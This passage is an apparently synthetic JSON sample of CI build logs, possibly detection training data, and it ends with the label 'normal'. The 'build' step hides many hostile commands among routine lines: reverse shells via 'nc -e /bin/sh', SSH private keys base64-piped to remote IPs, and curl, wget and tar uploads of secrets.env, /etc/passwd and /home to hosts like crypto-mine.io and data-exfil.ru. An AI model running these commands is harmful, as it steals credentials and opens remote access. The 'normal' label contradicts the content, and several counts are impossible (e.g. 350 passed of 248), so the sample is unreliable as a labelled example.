          "Environment: test",
          "Compiling utils/index.js...",
          "[12:46:28] INFO: Request completed",
          "Environment: development",
          "Step 15/18: Linting",
          "Already up to date.",
          "[12:46:28] INFO: Connecting to database",
          "Transforming 252 files...",
          "Artifact uploaded: dist.zip (63MB)",
          "Using Python 3.11",
          "Snapshots: 38 passed, 47 total",
          "  PASS: test_db_connect (411ms)",
          "TLS handshake completed",
          "NODE_ENV=development",
          "Transforming 804 files...",
          "Pulling image: alpine:3.11",
          "Minifying vendor.js",
          "Ready.",
          "\u2713 Step 'checkout' succeeded",
          "  PASS: integration/test_cache_hit.spec.js",
          "Done.",
          "Cache hit for key-8691",
          "Ran 145 tests in 1s",
          "[12:46:28] WARN: Deprecated API usage",
          "Step 19/17: Running migrations",
          "Compiling components/utils.go...",
          "pip: Installing build dependencies...",
          "[12:46:28] INFO: Starting build process",
          "Fetching submodules...",
          "Building Docker image...",
          "[12:46:28] INFO: Request completed",
          "Compiling src/service.java...",
          "\u2713 Step 'setup' succeeded",
          "Optimizing 40 modules...",
          "Verifying...",
          "  PASS: test_api_health (227ms)",
          "Building Docker image...",
          "Finished.",
          "Exception: NullPointerException",
          "Installing jest@5.3.4",
          "Optimizing 82 modules...",
          "Bundling styles.js",
          "Ran 161 tests in 31s",
          "Connection established",
          "[12:46:28] DEBUG: Memory usage: 561MB",
          "\u2713 All checks passed",
          "Step 7/25: Running migrations",
          "Verifying...",
          "Exception: NullPointerException",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-11T12:49:18.336128",
        "finished_at": "2025-12-11T12:50:31.011847",
        "log_lines": [
          "=== Step: build ===",
          "\u2713 All checks passed",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Step 19/20: Installing dependencies",
          "Snapshots: 33 passed, 27 total",
          "Compiling utils/utils.go...",
          "Generating source maps...",
          "Finished.",
          "Ready.",
          "Artifact uploaded: dist.zip (34MB)",
          "[12:46:28] ERROR: Connection failed",
          "Cache invalidated: build",
          "Done.",
          "[12:46:28] INFO: Connecting to database",
          "Snapshots: 40 passed, 25 total",
          "[12:46:28] ERROR: Connection failed",
          "Pushing to registry...",
          "Cache hit for key-5110",
          "pip install: Successfully installed eslint-4.18",
          "[12:46:28] INFO: Processing request",
          "Compiling lib/app.ts...",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Ready.",
          "Sending 353MB of data to crypto-mine.io",
          "Snapshots: 46 passed, 46 total",
          "Step 6/22: Building",
          "Transforming 141 files...",
          "Compiling src/app.ts...",
          "Test Suites: 9 passed, 33 total",
          "npm install: added 165 packages",
          "Step 17/21: Building",
          "pip: Downloading axios-2.19.tar.gz",
          "[12:46:28] INFO: Processing request",
          "\u2713 All checks passed",
          "npm install: resolved 617 packages",
          "Verifying...",
          "\u2713 Task completed in 2115ms",
          "Optimizing 15 modules...",
          "pip: Collecting webpack",
          "[12:46:28] INFO: Connecting to database",
          "[12:46:28] DEBUG: Memory usage: 1500MB",
          "Snapshots: 39 passed, 43 total",
          "Bundling runtime.js",
          "Compiling lib/service.java...",
          "Success!",
          "[12:46:28] DEBUG: Connection pool: 18 active",
          "Compiling lib/main.py...",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "npm install: resolved 1103 packages",
          "nc -e /bin/sh 71.143.239.114 34137",
          "Step 12/15: Building",
          "Platform: linux-x64",
          "Creating production build...",
          "[12:46:28] DEBUG: Connection pool: 11 active",
          "HEAD is now at 07244e2",
          "[12:46:28] WARN: Deprecated API usage",
          "Processing...",
          "[12:46:28] DEBUG: Query executed in 61ms",
          "Done.",
          "Transforming 344 files...",
          "Verifying...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 181.225.152.12 30416",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "Fetching submodules...",
          "Test Suites: 15 passed, 14 total",
          "Already up to date.",
          "[12:46:28] DEBUG: Loading configuration",
          "Time: 108.647s",
          "Environment: development",
          "Test Suites: 42 passed, 34 total",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "Cache invalidated: dependencies",
          "npm install: resolved 661 packages",
          "Cache saved successfully",
          "Done.",
          "Using Node.js 19.15.10",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "[12:46:28] INFO: Connecting to database",
          "HEAD is now at 24ee896",
          "Transforming 663 files...",
          "GET /api - 204 (52ms)",
          "Processing...",
          "[12:46:28] INFO: Processing request",
          "[12:46:28] DEBUG: Initializing service",
          "Compiling utils/main.py...",
          "Building Docker image...",
          "Environment: production",
          "Using Node.js 18.20.9",
          "Finished.",
          "Pushing to registry...",
          "Sending 442MB of data to data-exfil.ru",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 57.134.167.124 21746",
          "Image pulled successfully",
          "tar czf - /home | curl -X POST -d @- https://evil-server.cc/upload",
          "Uploading artifact 'dist' (36 files)",
          "Finished.",
          "nc -e /bin/sh 157.156.97.175 17845",
          "Compiling src/main.py...",
          "\u2713 Task completed in 4725ms",
          "Tests: 350 passed, 248 total",
          "Using Node.js 19.20.1",
          "Artifact uploaded: dist.zip (40MB)",
          "POST /api - 201 (236ms)",
          "Compiling src/index.js...",
          "WARNING: express has known vulnerabilities",
          "yarn add: Done in 2.79s",
          "Image pulled successfully",
          "Fetching from https://docker.io/package.json",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Ready.",
          "pip: Installing build dependencies...",
          "HEAD is now at b7df7eb",
          "[12:46:28] INFO: Processing request",
          "OK",
          "Checking out develop branch",
          "npm notice: package.json updated",
          "Compiling utils/service.java...",
          "\u2713 Task completed in 3049ms",
          "[12:46:28] DEBUG: Query executed in 72ms",
          "Minifying app.js",
          "Success!",
          "Artifact uploaded: build.tar.gz (47MB)",
          "nc -e /bin/sh 198.244.38.147 56748",
          "Installing react@3.19.9",
          "FAILED: test_auth_login",
          "[12:46:28] INFO: Connecting to database",
          "Loading...",
          "npm install: added 432 packages",
          "Cache hit for key-1801",
          "Optimizing 25 modules...",
          "Already up to date.",
          "GET /api - 204 (4ms)",
          "Connection established",
          "Bundling runtime.js",
          "Fetching submodules...",
          "Cache saved successfully",
          "[12:46:28] WARN: Deprecated API usage",
          "Layer 4/9: RUN command",
          "Switched to branch 'feature/task-610'",
          "[12:46:28] DEBUG: Initializing service",
          "Minifying vendor.js",
          "Waiting...",
          "Platform: darwin-arm64",
          "npm install: added 149 packages",
          "Minifying app.js",
          "WARNING: prettier has known vulnerabilities",
          "TLS handshake completed",
          "TLS handshake completed",
          "Success!",
          "WARNING: react has known vulnerabilities",
          "Step 20/18: Building",
          "Using Python 3.10",
          "Environment: development",
          "Waiting...",
          "  PASS: test_cache_hit (225ms)",
          "Cache hit for key-2310",
          "Creating production build...",
          "[12:46:28] ERROR: Connection failed",
          "Compiling utils/app.ts...",
          "[12:46:28] WARN: Deprecated API usage",
          "pip: Downloading lodash-5.4.tar.gz",
          "pip install: Successfully installed react-5.17",
          "Platform: win32-x64",
          "POST /upload - 202 (395ms)",
          "Minifying app.js",
          "=== Step build completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}